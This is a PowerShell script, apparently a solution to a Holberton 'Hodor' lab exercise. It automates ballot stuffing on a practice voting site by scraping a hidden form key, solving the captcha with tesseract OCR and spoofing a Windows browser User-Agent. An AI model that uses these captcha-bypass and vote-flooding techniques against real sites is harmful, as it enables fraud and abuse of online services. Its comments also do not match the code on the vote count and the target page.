#=======================================
#= 3. Level 3 - Holberton Hodor Project
#========================================

# ---------------------------------------
# script that votes 4096 times for your id
# here: http://158.69.76.135/level1.php.
# Using WebRequest session (GET - POST)

#   hint: Only count windows users votes
#   for this, use User-Agent in headers.
#-----------------------------------------

$url = "http://158.69.76.135/level3.php";
$headers = @{
'User-Agent'='Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0';
'referer'=$url;
'Content-Type'= 'application/x-www-form-urlencoded';
'ContentLength' = 512
}


for($i=1; $i -le 100; $i++){

    $progressPreference = 'silentlyContinue'
    $page = Invoke-WebRequest $url -Method Get -SessionVariable hodor;

    $parse = $page -split ' '
    $match_key = $parse -match 'value'
    $match_key = $match_key -split '='

    $captcha_path = "http://158.69.76.135/captcha.php"
    Invoke-WebRequest $captcha_path -OutFile "/tmp/captcha.png" -WebSession $hodor
    #$(New-Object Net.WebClient).DownloadFile($captcha_path, '/tmp/captcha.png') -WebSession $hodor
    Start-Process "/usr/bin/tesseract" -ArgumentList "/tmp/captcha.png","/tmp/result"
    $captcha = Get-Content -Path "/tmp/result.txt"
    $captcha

    $body = @{'id'='3922';'holdthedoor'="holdthedoor";'key'=$match_key[1].replace("`"","");'captcha'=$captcha}
    $body

    $IRM = Invoke-WebRequest -Uri $url -Method 'Post' -Headers $headers -Body $body -WebSession $hodor
    -join("sending vote ", $i, ": ")|Write-Host -NoNewline
    write-host $IRM.StatusDescription -ForegroundColor Green
}

Write-Host "sucessfull voting" -ForegroundColor DarkGreen
